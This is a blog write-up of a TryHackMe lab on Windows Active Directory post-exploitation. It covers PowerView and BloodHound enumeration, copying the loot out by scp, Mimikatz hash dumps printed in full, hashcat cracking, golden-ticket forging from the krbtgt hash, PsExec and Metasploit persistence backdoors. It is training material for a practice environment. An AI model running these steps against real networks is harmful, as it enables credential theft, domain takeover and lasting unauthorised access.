<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="nair0lf32 ">
<meta name="description" content="Just ssh with:
Your machine IP is 10.10.148.206
Username: Administrator
Password: P@$$W0rd
Domain Name: CONTROLLER
we run powershell powershell -ep bypass
PowerView then powerview . .\Downloads\PowerView.ps1
domain users enumeration Get-NetUser | select cn
cn--AdministratorGuestkrbtgtMachine-1Admin2Machine-2SQL ServicePOST{FLAG1_HERE}sshd groups enum Get-NetGroup -GroupName *admin*
AdministratorsHyper-V AdministratorsStorage Replica AdministratorsSchema AdminsEnterprise AdminsDomain AdminsKey AdminsEnterprise Key AdminsDnsAdmins further commands cheatsheet here" />
<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/writeups/tryhackme/post-exploitation-basics/post-exploitation-basics/" />


    <title>
        
            Post exploitation basics :: Zer0ne blog 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Post exploitation basics">
<meta itemprop="description" content="Just ssh with:
Your machine IP is 10.10.148.206
Username: Administrator
Password: P@$$W0rd
Domain Name: CONTROLLER
we run powershell powershell -ep bypass
PowerView then powerview . .\Downloads\PowerView.ps1
domain users enumeration Get-NetUser | select cn
cn--AdministratorGuestkrbtgtMachine-1Admin2Machine-2SQL ServicePOST{FLAG1_HERE}sshd groups enum Get-NetGroup -GroupName *admin*
AdministratorsHyper-V AdministratorsStorage Replica AdministratorsSchema AdminsEnterprise AdminsDomain AdminsKey AdminsEnterprise Key AdminsDnsAdmins further commands cheatsheet here"><meta itemprop="datePublished" content="2022-09-20T16:00:31+01:00" />
<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
<meta itemprop="wordCount" content="868"><meta itemprop="image" content="http://localhost:1313/" />
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="Post exploitation basics"/>
<meta name="twitter:description" content="Just ssh with:
Your machine IP is 10.10.148.206
Username: Administrator
Password: P@$$W0rd
Domain Name: CONTROLLER
we run powershell powershell -ep bypass
PowerView then powerview . .\Downloads\PowerView.ps1
domain users enumeration Get-NetUser | select cn
cn--AdministratorGuestkrbtgtMachine-1Admin2Machine-2SQL ServicePOST{FLAG1_HERE}sshd groups enum Get-NetGroup -GroupName *admin*
AdministratorsHyper-V AdministratorsStorage Replica AdministratorsSchema AdminsEnterprise AdminsDomain AdminsKey AdminsEnterprise Key AdminsDnsAdmins further commands cheatsheet here"/>



    <meta property="og:title" content="Post exploitation basics" />
<meta property="og:description" content="Just ssh with:
Your machine IP is 10.10.148.206
Username: Administrator
Password: P@$$W0rd
Domain Name: CONTROLLER
we run powershell powershell -ep bypass
PowerView then powerview . .\Downloads\PowerView.ps1
domain users enumeration Get-NetUser | select cn
cn--AdministratorGuestkrbtgtMachine-1Admin2Machine-2SQL ServicePOST{FLAG1_HERE}sshd groups enum Get-NetGroup -GroupName *admin*
AdministratorsHyper-V AdministratorsStorage Replica AdministratorsSchema AdminsEnterprise AdminsDomain AdminsKey AdminsEnterprise Key AdminsDnsAdmins further commands cheatsheet here" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/tryhackme/post-exploitation-basics/post-exploitation-basics/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2022-09-20T16:00:31+01:00" />
<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />





    <meta property="article:section" content="TryHackMe" />



    <meta property="article:published_time" content="2022-09-20 16:00:31 &#43;0100 WAT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="http://localhost:1313/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">#&gt;</span>
            <span class="logo__text">0/1</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#0FF00D;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/writeups/tryhackme/post-exploitation-basics/post-exploitation-basics/">Post exploitation basics</a></h2>

            
            
            

            <div class="post-content">
                <!-- raw HTML omitted -->
<p>Just ssh with:</p>
<p>Your machine IP is 10.10.148.206</p>
<p>Username: Administrator</p>
<p>Password: P@$$W0rd</p>
<p>Domain Name: CONTROLLER</p>
<p>we run powershell <code>powershell -ep bypass</code></p>
<h2 id="powerview">PowerView</h2>
<p>then powerview <code>. .\Downloads\PowerView.ps1</code></p>
<p>domain users enumeration <code>Get-NetUser | select cn</code></p>
<pre tabindex="0"><code>cn
--
Administrator
Guest
krbtgt
Machine-1
Admin2
Machine-2
SQL Service
POST{FLAG1_HERE}
sshd
</code></pre><p>groups enum <code>Get-NetGroup -GroupName *admin*</code></p>
<pre tabindex="0"><code>Administrators
Hyper-V Administrators
Storage Replica Administrators
Schema Admins
Enterprise Admins
Domain Admins
Key Admins
Enterprise Key Admins
DnsAdmins
</code></pre><p>further commands <a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">cheatsheet here</a></p>
<pre tabindex="0"><code>PS C:\Users\Administrator&gt; Invoke-ShareFinder
\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin
\\Domain-Controller.CONTROLLER.local\C$         - Default share
\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
\\Domain-Controller.CONTROLLER.local\Share      -
\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share
</code></pre><pre tabindex="0"><code>PS C:\Users\Administrator&gt; Get-NetComputer -fulldata | select operatingsystem

operatingsystem
---------------
Windows Server 2019 Standard
Windows 10 Enterprise Evaluation
Windows 10 Enterprise Evaluation
</code></pre><h2 id="bloodhound">Bloodhound</h2>
<p>Install bloodhond and neo4j with apt</p>
<p>In powershell use <code>. .\Downloads\SharpHound.ps1</code></p>
<p>Loot</p>
<pre tabindex="0"><code>PS C:\Users\Administrator&gt; Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
------------------------------------------------
Initializing SharpHound at 2:27 PM on 11/19/2021
------------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain CONTROLLER.LOCAL using path CN=Schema,CN=Configuration,DC=CONTROLLER,DC=LOCAL
PS C:\Users\Administrator&gt; [+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 95 MB RAM
Status: 66 objects finished (+66 8)/s -- Using 99 MB RAM
Enumeration finished in 00:00:00.7080884
Compressing data to C:\Users\Administrator\20211119142703_loot.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 2:27 PM on 11/19/2021! Happy Graphing!
</code></pre><p>first enable ssh temporaly <code>sudo sytemctl start ssh.socket</code></p>
<p>then on remote machine get your loot</p>
<p><code>scp .\20211119152332_loot.zip nair0lf32@10.8.226.203:/home/nair0lf32/loot.zip</code></p>
<p>start neo4j <code>sudo neo4j console</code> or <code>sudo neo4j start</code></p>
<p>then <code>bloodhound</code></p>
<p>after login deploy hamurger menu and &lsquo;analysis&rsquo;</p>
<h2 id="mimikatz">Mimikatz</h2>
<p>Exit powershell with <code>exit</code></p>
<p>Go where it is and run mimikatz</p>
<p><code>cd Downloads &amp;&amp; mimikatz.exe</code></p>
<p><code>privilege::debug</code>
Should be <code>Privilege '20' OK</code></p>
<p>Then we dump hashes</p>
<p><code>lsadump::lsa /patch</code></p>
<pre tabindex="0"><code>Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 5508500012cc005cf7082a9a89ebdfdf

RID  : 0000044f (1103)
User : Machine1
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000451 (1105)
User : Admin2
LM   :
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe

RID  : 00000452 (1106)
User : Machine2
LM   :
NTLM : c39f2beb3d2ec06a62cb887fb391dee0

RID  : 00000453 (1107)
User : SQLService
LM   :
NTLM : f4ab68f27303bcb4024650d8fc5f973a

RID  : 00000454 (1108)
User : POST
LM   :
NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2

RID  : 00000457 (1111)
User : sshd
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000003e8 (1000)
User : DOMAIN-CONTROLL$
LM   :
NTLM : 9f39a3b67c58269c707986cdaa1bb782

RID  : 00000455 (1109)
User : DESKTOP-2$
LM   :
NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c

RID  : 00000456 (1110)
User : DESKTOP-1$
LM   :
NTLM : 7d33346eeb11a4f12a6c201faaa0d89a
</code></pre><p>then we rack them <code>hashcat -m 1000 &lt;hash&gt; rockyou.txt</code></p>
<h3 id="mimikatz-golden-ticket">Mimikatz Golden Ticket</h3>
<p>Dump hash of kerberos admin we identified earlier</p>
<p><code>lsadump::lsa /inject /name:krbtgt</code></p>
<pre tabindex="0"><code>Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166

RID  : 000001f6 (502)
User : krbtgt

* Primary
NTLM : 5508500012cc005cf7082a9a89ebdfdf
LM   :
Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf
ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf
lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c

* WDigest
01  49a8de3b6c7ae1ddf36aa868e68cd9ea
02  7902703149b131c57e5253fd9ea710d0
03  71288a6388fb28088a434d3705cc6f2a
04  49a8de3b6c7ae1ddf36aa868e68cd9ea
05  7902703149b131c57e5253fd9ea710d0
06  df5ad3cc1ff643663d85dabc81432a81
07  49a8de3b6c7ae1ddf36aa868e68cd9ea
08  a489809bd0f8e525f450fac01ea2054b
09  19e54fd00868c3b0b35b5e0926934c99
10  4462ea84c5537142029ea1b354cd25fa
11  6773fcbf03fd29e51720f2c5087cb81c
12  19e54fd00868c3b0b35b5e0926934c99
13  52902abbeec1f1d3b46a7bd5adab3b57
14  6773fcbf03fd29e51720f2c5087cb81c
15  8f2593c344922717d05d537487a1336d
16  49c009813995b032cc1f1a181eaadee4
17  8552f561e937ad7c13a0dca4e9b0b25a
18  cc18f1d9a1f4d28b58a063f69fa54f27
19  12ae8a0629634a31aa63d6f422a14953
20  b6392b0471c53dd2379dcc570816ba10
21  7ab113cb39aa4be369710f6926b68094
22  7ab113cb39aa4be369710f6926b68094
23  e38f8bc728b21b85602231dba189c5be
24  4700657dde6382cd7b990fb042b00f9e
25  8f46d9db219cbd64fb61ba4fdb1c9ba7
26  36b6a21f031bf361ce38d4d8ad39ee0f
27  e69385ee50f9d3e105f50c61c53e718e
28  ca006400aefe845da46b137b5b50f371
29  15a607251e3a2973a843e09c008c32e3

* Kerberos
Default Salt : CONTROLLER.LOCALkrbtgt
Credentials
des_cbc_md5       : 64ef5d43922f3b5d

* Kerberos-Newer-Keys
Default Salt : CONTROLLER.LOCALkrbtgt
Default Iterations : 4096
Credentials
aes256_hmac       (4096) : 8e544cabf340db750cef9f5db7e1a2f97e465dffbd5a2dc64246bda3c75fe53d
aes128_hmac       (4096) : 7eb35bddd529c0614e5ad9db4c798066
des_cbc_md5       (4096) : 64ef5d43922f3b5d

* NTLM-Strong-NTOWF
Random Value : 666caaaaf30081f30211bd7fa445fec4
</code></pre><p>from those we can create a golden Ticket</p>
<p><code>kerberos::golden /user: /domain: /sid: /krbtgt: /id:</code></p>
<p>in this case it would give</p>
<p><code>kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500</code></p>
<pre tabindex="0"><code>User      : Administrator
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-849420856-2351964222-986696166
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
Lifetime  : 11/19/2021 4:08:13 PM ; 11/17/2031 4:08:13 PM ; 11/17/2031 4:08:13 PM
-&gt; Ticket : ticket.kirbi

* PAC generated
* PAC signed
* EncTicketPart generated
* EncTicketPart encrypted
* KrbCred generated

Final Ticket Saved to file !
</code></pre><p>To use our ticket we run in mimikatz <code>misc::cmd</code></p>
<p><code>Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF7D8DA43B8</code></p>
<p>This will open a new command prompt with elevated privileges to all machines (amazing)</p>
<p>exit and try stuff like <code>dir \\Desktop-1\c$ </code> or <code>PsExec.exe \\Desktop-1 cmd.exe</code></p>
<p>normally you get those commands executed but tryhackme doesnt allow networking here</p>
<p><code>The network path was not found.</code></p>
<h2 id="server-manager">Server Manager</h2>
<p>RDP to the machine
<code>xfreerdp /u:CONTROLLER\Administrator /p:P@$$W0rd /v:10.10.2.124</code></p>
<p>If any issue with xfreerdp login remove <code>/p:</code> and copy Password manually after prompt</p>
<p>Navigate to the tools tab and select the Active Directory Users and Computers</p>
<p>user accounts may set the service accounts passwords inside of the description</p>
<h2 id="backdoors">Backdoors</h2>
<p>After access with metasploit there is a module for persisten Backdoors</p>
<p><code>exploit/windows/local/persistence</code></p>
<p>Here you can see the session die however the second we run the handler again we get a meterpreter shell back thanks to the persistence service</p>
<p>There are other ways of maintaining access such as adding users and rootkits however I will leave you to do your own research and labs on those topics</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/categories/tryhackme/">TryHackMe</a></span>
        
    </p>

			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="http://localhost:1313/">nair0lf32</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>



    </body>
</html>
